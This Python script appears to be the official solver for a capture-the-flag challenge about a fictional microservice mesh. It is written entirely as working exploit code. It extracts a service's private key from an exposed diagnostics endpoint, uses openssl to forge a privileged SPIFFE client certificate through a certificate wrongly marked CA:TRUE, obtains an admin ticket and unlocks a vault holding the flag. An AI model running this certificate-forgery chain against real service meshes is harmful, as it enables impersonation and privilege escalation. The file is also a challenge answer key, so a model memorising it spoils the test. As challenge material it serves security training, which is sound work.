#!/usr/bin/env python3
"""
Latverian Sovereign Microservice Mesh (X02 - Microservice Trust)
Official Automated Solver & Exploit Script

Exploit Chain:
1. Query Gateway / Service A (telemetry-agent) diagnostic bundle to extract internal mesh certificates and private key.
2. Identify that Service A's certificate was issued with `BasicConstraints: CA:TRUE` (Intermediate Sub-CA flaw).
3. Generate a new RSA key and forge an identity certificate for `spiffe://latveria.citadel/sa/doombot-orchestrator` signed by Service A's key.
4. Send signed identity chain to Service B (`POST /api/v1/core/grant-admin-ticket`) to obtain an Admin Grant Ticket.
5. Present Admin Grant Ticket to Admin Vault (`POST /api/v1/admin/unlock-vault`) to recover the challenge flag.
"""

import argparse
import base64
import json
import os
import re
import subprocess
import sys
import tempfile
import urllib.error
import urllib.request


def http_request(url, method="GET", headers=None, data=None):
    if headers is None:
        headers = {}
    
    encoded_data = None
    if data is not None:
        if isinstance(data, (dict, list)):
            encoded_data = json.dumps(data).encode("utf-8")
            if "Content-Type" not in headers:
                headers["Content-Type"] = "application/json"
        elif isinstance(data, str):
            encoded_data = data.encode("utf-8")
        else:
            encoded_data = data

    req = urllib.request.Request(url, data=encoded_data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode("utf-8")
            try:
                return resp.status, json.loads(body)
            except Exception:
                return resp.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8")
        try:
            return e.code, json.loads(body)
        except Exception:
            return e.code, body


def forge_orchestrator_certificate(sa_cert_pem: str, sa_key_pem: str) -> str:
    """Forges an X.509 certificate for doombot-orchestrator signed by Service A's sub-CA key."""
    with tempfile.TemporaryDirectory() as tmpdir:
        sa_key_file = os.path.join(tmpdir, "sa.key")
        sa_crt_file = os.path.join(tmpdir, "sa.crt")
        orch_key_file = os.path.join(tmpdir, "orch.key")
        orch_csr_file = os.path.join(tmpdir, "orch.csr")
        orch_crt_file = os.path.join(tmpdir, "orch.crt")
        orch_ext_file = os.path.join(tmpdir, "orch.ext")

        with open(sa_key_file, "w") as f:
            f.write(sa_key_pem)
        with open(sa_crt_file, "w") as f:
            f.write(sa_cert_pem)

        with open(orch_ext_file, "w") as f:
            f.write("basicConstraints = CA:FALSE\n")
            f.write("keyUsage = digitalSignature, keyEncipherment\n")
            f.write("subjectAltName = URI:spiffe://latveria.citadel/sa/doombot-orchestrator, DNS:doombot-orchestrator.latveria.local\n")

        # 1. Generate new private key for orchestrator
        subprocess.run([
            "openssl", "req", "-newkey", "rsa:2048", "-nodes",
            "-keyout", orch_key_file, "-out", orch_csr_file,
            "-subj", "/CN=doombot-orchestrator.latveria.local/O=Latverian Defense Network/OU=Command Core"
        ], check=True, capture_output=True)

        # 2. Sign the new certificate with Service A's key and certificate
        subprocess.run([
            "openssl", "x509", "-req", "-in", orch_csr_file,
            "-CA", sa_crt_file, "-CAkey", sa_key_file,
            "-CAcreateserial", "-out", orch_crt_file, "-days", "365",
            "-extfile", orch_ext_file
        ], check=True, capture_output=True)

        with open(orch_crt_file, "r") as f:
            forged_leaf_pem = f.read()

        # Build certificate chain: Leaf (Orchestrator) + Intermediate (Service A)
        full_cert_chain = forged_leaf_pem.strip() + "\n" + sa_cert_pem.strip()
        return full_cert_chain


def solve(host="127.0.0.1", port=80):
    base_url = f"http://{host}:{port}"
    print(f"[*] Targeting Latverian Sovereign Citadel Gateway at {base_url}...")

    # Step 1: Query Gateway Topology
    print("[1] Querying Gateway Topology...")
    status, topo = http_request(f"{base_url}/api/v1/topology")
    if status != 200:
        print(f"[-] Failed to fetch topology (HTTP {status}): {topo}")
        return False
    print(f"[+] Discovered mesh topology: {list(topo.get('services', {}).keys())}")

    # Step 2: Query Service A (Telemetry) Diagnostics Bundle
    print("[2] Extracting Service A Diagnostic Bundle from /api/v1/diagnostics/export...")
    status, diag = http_request(f"{base_url}/api/v1/diagnostics/export")
    if status != 200:
        print(f"[-] Failed to export diagnostics (HTTP {status}): {diag}")
        return False

    creds = diag.get("credentials", {})
    ca_cert = creds.get("ca_certificate")
    sa_cert = creds.get("service_certificate")
    sa_key = creds.get("service_private_key")

    if not (ca_cert and sa_cert and sa_key):
        print("[-] Incomplete credentials in diagnostic bundle!")
        return False
    print("[+] Successfully extracted CA certificate, Service A certificate, and Service A private key.")

    # Step 3: Forge privileged orchestrator identity certificate
    print("[3] Forging privileged client certificate (spiffe://latveria.citadel/sa/doombot-orchestrator) signed by Service A...")
    cert_chain = forge_orchestrator_certificate(sa_cert, sa_key)
    print("[+] Forged X.509 client certificate chain created.")

    # Step 4: Request Admin Ticket from Service B (Core Controller)
    print("[4] Submitting forged identity assertion to Service B (POST /api/v1/core/grant-admin-ticket)...")
    # Base64 encode the certificate chain for safe HTTP header transport
    encoded_cert_chain = base64.b64encode(cert_chain.encode("utf-8")).decode("utf-8")
    headers = {
        "X-Citadel-Identity-Cert": encoded_cert_chain,
        "Content-Type": "application/json"
    }
    status, core_resp = http_request(
        f"{base_url}/api/v1/core/grant-admin-ticket",
        method="POST",
        headers=headers,
        data={}
    )

    if status != 200 or not isinstance(core_resp, dict) or "admin_ticket" not in core_resp:
        print(f"[-] Failed to obtain admin ticket (HTTP {status}): {core_resp}")
        return False

    admin_ticket = core_resp["admin_ticket"]
    print(f"[+] Admin Ticket Granted: {admin_ticket}")

    # Step 5: Unlock Admin Vault and retrieve flag
    print("[5] Presenting Admin Ticket to Admin Vault (POST /api/v1/admin/unlock-vault)...")
    admin_headers = {
        "Authorization": f"Bearer {admin_ticket}",
        "Content-Type": "application/json"
    }
    status, vault_resp = http_request(
        f"{base_url}/api/v1/admin/unlock-vault",
        method="POST",
        headers=admin_headers,
        data={}
    )

    if status != 200 or not isinstance(vault_resp, dict) or "flag" not in vault_resp:
        print(f"[-] Failed to unlock vault (HTTP {status}): {vault_resp}")
        return False

    flag = vault_resp["flag"]
    print("\n" + "=" * 60)
    print(f" [!] EXPLOIT SUCCESSFUL — RETRIEVED FLAG:")
    print(f"     {flag}")
    print("=" * 60 + "\n")
    return flag


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="X02 Microservice Trust Exploit Solver")
    parser.add_argument("--host", default="127.0.0.1", help="Target host (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    args = parser.parse_args()

    flag = solve(args.host, args.port)
    if not flag:
        sys.exit(1)
